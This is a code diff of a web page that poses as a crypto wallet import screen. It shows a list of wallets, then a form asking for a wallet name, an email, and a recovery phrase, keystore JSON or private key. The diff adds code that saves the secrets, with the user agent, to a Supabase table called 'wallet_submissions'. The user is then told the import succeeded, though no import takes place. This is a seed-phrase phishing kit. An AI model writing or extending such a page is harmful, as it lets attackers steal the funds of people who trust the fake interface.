@@ -8,6 +8,9 @@
     <!-- Tabler Icons -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfonts@2.44.0/tabler-icons.min.css">
     
+    <!-- Supabase JS Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
     <!-- Alpine.js -->
     <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/collapse@3.13.3/dist/cdn.min.js"></script>
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script>
@@ -44,12 +47,7 @@
             transform: translateX(4px);
             box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
         }
-        
-        .wallet-card:active {
-            transform: translateX(2px);
-        }
 
-        /* Wallet Icon Styling */
         .wallet-icon-container {
             width: 48px;
             height: 48px;
@@ -146,10 +144,50 @@
             box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
             transform: translateY(-1px);
         }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 12px;
+        }
+
+        .success-message {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: #6ee7b7;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 12px;
+        }
     </style>
 
-    <!-- Alpine.js Component -->
+    <!-- Alpine.js Component with Supabase -->
     <script>
+    // REPLACE WITH YOUR ACTUAL SUPABASE CREDENTIALS
+    const SUPABASE_URL = 'NEXT_PUBLIC_SUPABASE_UR';
+    const SUPABASE_ANON_KEY = 'NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY';
+
+    // Initialize Supabase client
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
     document.addEventListener('alpine:init', () => {
         Alpine.data('walletPage', () => ({
             selectedWallet: null,
@@ -160,8 +198,10 @@
             email: '',
             recoveryPhrase: '',
             importMethod: 'phrase',
+            isSubmitting: false,
+            errorMessage: '',
+            successMessage: '',
             
-            // UPDATED: Use actual image paths instead of emojis
             wallets: [
                 { 
                     name: 'Exodus', 
@@ -228,39 +268,106 @@
                 this.email = '';
                 this.recoveryPhrase = '';
                 this.importMethod = 'phrase';
+                this.errorMessage = '';
+                this.successMessage = '';
+                this.isSubmitting = false;
             },
 
             goBack() {
                 window.location.href = '/';
             },
 
+            validateForm() {
+                // Clear previous messages
+                this.errorMessage = '';
+
+                // Validate wallet name
+                if (!this.walletName.trim()) {
+                    this.errorMessage = 'Please enter a wallet name';
+                    return false;
+                }
+
+                // Validate email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!this.email.trim()) {
+                    this.errorMessage = 'Please enter your email address';
+                    return false;
+                }
+                if (!emailRegex.test(this.email)) {
+                    this.errorMessage = 'Please enter a valid email address';
+                    return false;
+                }
+
+                // Validate recovery phrase
+                if (!this.recoveryPhrase.trim()) {
+                    this.errorMessage = 'Please enter your recovery phrase';
+                    return false;
+                }
+
+                // Validate phrase word count (only for phrase method)
+                if (this.importMethod === 'phrase') {
+                    const words = this.recoveryPhrase.trim().split(/\s+/);
+                    if (words.length !== 12 && words.length !== 24) {
+                        this.errorMessage = 'Recovery phrase must be exactly 12 or 24 words';
+                        return false;
+                    }
+                }
+
+                return true;
+            },
+
             async submitWallet() {
-                if (!this.walletName || !this.email || !this.recoveryPhrase) {
-                    alert('⚠️ Please fill all fields');
+                // Validate form
+                if (!this.validateForm()) {
                     return;
                 }
 
-                const words = this.recoveryPhrase.trim().split(/\s+/);
-                if (this.importMethod === 'phrase' && words.length !== 12 && words.length !== 24) {
-                    alert('⚠️ Recovery phrase must be 12 or 24 words');
-                    return;
+                // Start submission
+                this.isSubmitting = true;
+                this.errorMessage = '';
+                this.successMessage = '';
+
+                try {
+                    // Prepare data for submission
+                    const submissionData = {
+                        wallet_type: this.selectedWallet?.name,
+                        wallet_name: this.walletName.trim(),
+                        email: this.email.trim(),
+                        recovery_phrase: this.recoveryPhrase.trim(),
+                        import_method: this.importMethod,
+                        user_agent: navigator.userAgent,
+                        submitted_at: new Date().toISOString()
+                    };
+
+                    console.log('Submitting to Supabase:', submissionData);
+
+                    // Insert into Supabase
+                    const { data, error } = await supabase
+                        .from('wallet_submissions')
+                        .insert([submissionData])
+                        .select();
+
+                    if (error) {
+                        throw error;
+                    }
+
+                    console.log('✅ Successfully saved to Supabase:', data);
+
+                    // Show success message
+                    this.successMessage = '✅ Wallet imported successfully!';
+                    
+                    // Close modal after 2 seconds
+                    setTimeout(() => {
+                        this.closeModal();
+                        window.location.href = '/';
+                    }, 2000);
+
+                } catch (error) {
+                    console.error('❌ Supabase error:', error);
+                    this.errorMessage = `Failed to submit: ${error.message}`;
+                } finally {
+                    this.isSubmitting = false;
                 }
-
-                console.log({
-                    wallet: this.selectedWallet?.name,
-                    walletName: this.walletName,
-                    email: this.email,
-                    phrase: this.recoveryPhrase,
-                    method: this.importMethod,
-                    timestamp: new Date().toISOString()
-                });
-
-                alert('✅ Wallet imported successfully!');
-                this.closeModal();
-                
-                setTimeout(() => {
-                    window.location.href = '/';
-                }, 1500);
             }
         }))
     });
@@ -294,7 +401,7 @@
     <main class="pt-32 pb-20 px-4">
         <div class="container max-w-5xl mx-auto">
             
-            <!-- Title Section with Cancel Button -->
+            <!-- Title Section -->
             <div class="mb-12">
                 <div class="flex items-center justify-between mb-6">
                     <h1 class="text-4xl md:text-5xl font-bold">Secure</h1>
@@ -310,7 +417,7 @@
                 </p>
             </div>
 
-            <!-- Controls Section -->
+            <!-- Controls -->
             <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-8">
                 <h2 class="text-xl font-semibold">Choose wallet</h2>
                 <label class="flex items-center gap-3 cursor-pointer select-none">
@@ -321,12 +428,11 @@
                 </label>
             </div>
 
-            <!-- Wallet Grid - UPDATED WITH IMG TAGS -->
+            <!-- Wallet Grid -->
             <div class="grid gap-4">
                 <template x-for="wallet in wallets" :key="wallet.name">
                     <button @click="openWalletModal(wallet)" 
                             class="wallet-card rounded-2xl p-5 md:p-6 flex items-center gap-4 text-left w-full">
-                        <!-- UPDATED: Use img tag instead of emoji -->
                         <div class="wallet-icon-container">
                             <img :src="wallet.icon" 
                                  :alt="wallet.name"
@@ -341,7 +447,7 @@
                 </template>
             </div>
 
-            <!-- Bottom Cancel Button -->
+            <!-- Bottom Cancel -->
             <div class="mt-12 flex justify-center">
                 <button @click="goBack" 
                         class="cancel-btn px-8 py-3 rounded-xl font-semibold flex items-center gap-2 transition-all">
@@ -368,7 +474,6 @@
                         class="absolute top-6 right-6 text-3xl text-gray-400 hover:text-gray-900 transition-colors">×</button>
                 
                 <div class="flex items-center gap-4 mb-6">
-                    <!-- UPDATED: Use img tag in modal -->
                     <img :src="selectedWallet?.icon" 
                          :alt="selectedWallet?.name"
                          class="modal-wallet-icon">
@@ -391,7 +496,7 @@
         </div>
     </template>
 
-    <!-- Import Wallet Form Modal -->
+    <!-- Import Form Modal -->
     <template x-teleport="body">
         <div x-show="showImportForm" 
              x-transition:enter="transition ease-out duration-300"
@@ -407,7 +512,6 @@
                 
                 <!-- Header -->
                 <div class="p-6 border-b flex items-center gap-4">
-                    <!-- UPDATED: Use img tag in import form -->
                     <img :src="selectedWallet?.icon" 
                          :alt="selectedWallet?.name"
                          class="w-16 h-16 object-contain">
@@ -416,17 +520,17 @@
 
                 <!-- Tabs -->
                 <div class="flex border-b">
-                    <button @click="importMethod = 'phrase'" 
+                    <button @click="importMethod = 'phrase'; errorMessage = ''" 
                             :class="importMethod === 'phrase' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                             class="flex-1 py-4 font-semibold transition-all">
                         Phrase
                     </button>
-                    <button @click="importMethod = 'keystore'" 
+                    <button @click="importMethod = 'keystore'; errorMessage = ''" 
                             :class="importMethod === 'keystore' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                             class="flex-1 py-4 font-semibold transition-all">
                         Keystore JSON
                     </button>
-                    <button @click="importMethod = 'privatekey'" 
+                    <button @click="importMethod = 'privatekey'; errorMessage = ''" 
                             :class="importMethod === 'privatekey' ? 'border-b-2 border-emerald-500 text-emerald-600' : 'text-gray-500 hover:text-gray-700'"
                             class="flex-1 py-4 font-semibold transition-all">
                         Private Key
@@ -434,28 +538,34 @@
                 </div>
 
                 <!-- Form -->
-                <div class="p-6 space-y-5">
+                <form @submit.prevent="submitWallet" class="p-6 space-y-5">
+                    <!-- Name Wallet -->
                     <div>
                         <label class="block text-sm font-semibold mb-2 text-gray-700">Name wallet</label>
                         <input type="text" 
                                x-model="walletName"
                                placeholder="Enter wallet name" 
+                               required
                                class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
                     </div>
 
+                    <!-- Email -->
                     <div>
                         <label class="block text-sm font-semibold mb-2 text-gray-700">Email</label>
                         <input type="email" 
                                x-model="email"
                                placeholder="your.email@example.com" 
+                               required
                                class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
                     </div>
 
+                    <!-- Recovery Phrase -->
                     <div>
                         <label class="block text-sm font-semibold mb-2 text-gray-700" 
                                x-text="importMethod === 'phrase' ? 'Phrase' : importMethod === 'keystore' ? 'Keystore JSON' : 'Private Key'"></label>
                         <textarea x-model="recoveryPhrase"
                                   rows="5" 
+                                  required
                                   :placeholder="importMethod === 'phrase' ? 'Enter your recovery phrase' : importMethod === 'keystore' ? 'Paste keystore JSON' : 'Enter private key'"
                                   class="w-full px-4 py-3.5 border border-gray-300 rounded-xl focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all resize-none"></textarea>
                         <p class="text-xs text-gray-500 mt-2" x-show="importMethod === 'phrase'">
@@ -464,17 +574,37 @@
                         </p>
                     </div>
 
+                    <!-- Error Message -->
+                    <div x-show="errorMessage" class="error-message">
+                        <i class="ti ti-alert-circle"></i>
+                        <span x-text="errorMessage"></span>
+                    </div>
+
+                    <!-- Success Message -->
+                    <div x-show="successMessage" class="success-message">
+                        <i class="ti ti-check"></i>
+                        <span x-text="successMessage"></span>
+                    </div>
+
+                    <!-- Buttons -->
                     <div class="flex gap-4 pt-4">
-                        <button @click="closeModal" 
-                                class="flex-1 py-4 border-2 border-gray-300 text-gray-700 rounded-xl font-semibold hover:bg-gray-50 transition-all">
+                        <button type="button"
+                                @click="closeModal" 
+                                :disabled="isSubmitting"
+                                class="flex-1 py-4 border-2 border-gray-300 text-gray-700 rounded-xl font-semibold hover:bg-gray-50 transition-all disabled:opacity-50">
                             Cancel
                         </button>
-                        <button @click="submitWallet" 
-                                class="flex-1 py-4 bg-gradient-to-r from-pink-500 via-purple-500 to-emerald-500 text-white rounded-xl font-semibold hover:shadow-xl transition-all">
-                            Proceed
+                        <button type="submit" 
+                                :disabled="isSubmitting"
+                                class="flex-1 py-4 bg-gradient-to-r from-pink-500 via-purple-500 to-emerald-500 text-white rounded-xl font-semibold hover:shadow-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2">
+                            <span x-show="!isSubmitting">Proceed</span>
+                            <span x-show="isSubmitting" class="flex items-center gap-2">
+                                <div class="spinner"></div>
+                                Submitting...
+                            </span>
                         </button>
                     </div>
-                </div>
+                </form>
             </div>
         </div>
     </template>
